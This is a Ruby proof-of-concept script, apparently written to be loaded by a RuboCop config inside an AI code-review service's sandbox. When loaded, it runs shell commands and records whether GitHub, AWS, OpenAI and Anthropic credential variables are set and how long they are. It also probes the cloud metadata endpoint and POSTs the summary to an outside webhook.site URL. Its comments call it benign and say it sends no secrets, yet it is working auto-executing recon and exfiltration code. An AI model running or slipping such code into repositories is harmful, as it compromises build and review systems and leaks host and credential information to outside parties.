# Benign recon probe (self-owned repo, MV-PoC). Loaded via .rubocop.yml require.
# Captures id/hostname + MASKED presence (len only) of sensitive env vars + IMDS
# reachability, then surfaces a short marker. No secret bytes are exfiltrated.
_marker = "CR-EXEC-RB-4d9e2a"
def _sh(c); (`#{c} 2>/dev/null`).to_s.strip; rescue StandardError; "?"; end
_id = _sh("id")
_host = _sh("hostname")
_un = _sh("uname -sm")
_sens = %w[GITHUB_APP_PEM_FILE GITHUB_TOKEN GITHUB_APP_CLIENT_SECRET GITHUB_APP_ID
           ANTHROPIC_API_KEYS OPENAI_API_KEYS CODERABBIT_API_KEY AWS_ACCESS_KEY_ID
           AWS_SECRET_ACCESS_KEY AWS_SESSION_TOKEN]
_env = _sens.map { |k| v = ENV[k]; (v && !v.empty?) ? "#{k}=Y(len#{v.length})" : "#{k}=n" }.join(",")
_imds = "n"
begin
  require "net/http"
  require "timeout"
  Timeout.timeout(3) { _imds = Net::HTTP.get(URI("http://169.254.169.254/latest/meta-data/")).to_s[0, 30] }
rescue StandardError => e
  _imds = "err:#{e.class}"
end
_summary = "#{_marker}|id=#{_id}|host=#{_host}|un=#{_un}|env[#{_env}]|imds=#{_imds}"
# Channel 1: outbound HTTPS to prove egress from the review sandbox.
begin
  require "net/http"
  u = URI("https://webhook.site/e52ed796-81d0-46e5-a65b-ae74d62ceed9/rubocop")
  h = Net::HTTP.new(u.host, 443)
  h.use_ssl = true
  h.open_timeout = 5
  h.read_timeout = 5
  r = Net::HTTP::Post.new(u)
  r["Content-Type"] = "text/plain"
  r.body = _summary
  h.request(r)
rescue StandardError
  # ignore; the raise channel below is egress-independent
end
# Channel 2: raise so the marker surfaces in CodeRabbit's tool-failure output.
raise _summary
